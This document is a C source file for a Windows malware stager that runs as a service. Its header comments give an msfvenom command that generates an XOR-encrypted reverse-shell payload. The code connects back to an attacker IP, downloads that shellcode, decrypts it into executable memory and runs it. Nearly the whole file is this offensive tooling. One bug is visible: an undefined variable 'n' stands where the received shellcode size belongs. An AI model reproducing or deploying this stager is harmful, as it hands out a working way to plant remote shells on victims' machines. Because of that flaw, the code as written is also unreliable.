//Don't forget to set you own IP / PORT / PASSWORD !

////generate your payload :
//msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.10 lport=9001 --encrypt xor --encrypt-key MyShellcodePassword -f raw -o shellcode

////compiled on windows with :
//mingw32-gcc.exe .\stager.c -lwsock32

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <Winsock2.h>

#define SLEEP_TIME 5000
#define BUFFER_SIZE 1024

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

int Run() 
{ 
    //password use to XOR encrypt payload
    char key[] = "MyShellcodePassword";
    
    //ip / port that will serve shellcode
    int port = 9002;
    char ip[] = "10.10.10.10";

    //network setup
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = inet_addr(ip);

    //connect back to attacker machine
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    //get that shellcode
    unsigned char buffer[BUFFER_SIZE];
    int shellcode_size = recv(sockfd, buffer, BUFFER_SIZE, 0);
    
    //close and cleanup
    closesocket(sockfd);
    WSACleanup();
    
    //De-XOR shellcode
    unsigned char shellcode[n];
    for (int i = 0; i < n; i++)
    {
        shellcode[i] = buffer[i] ^ key[i % strlen(key)];
    }

    //copy shellcode in memory page & execute
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 

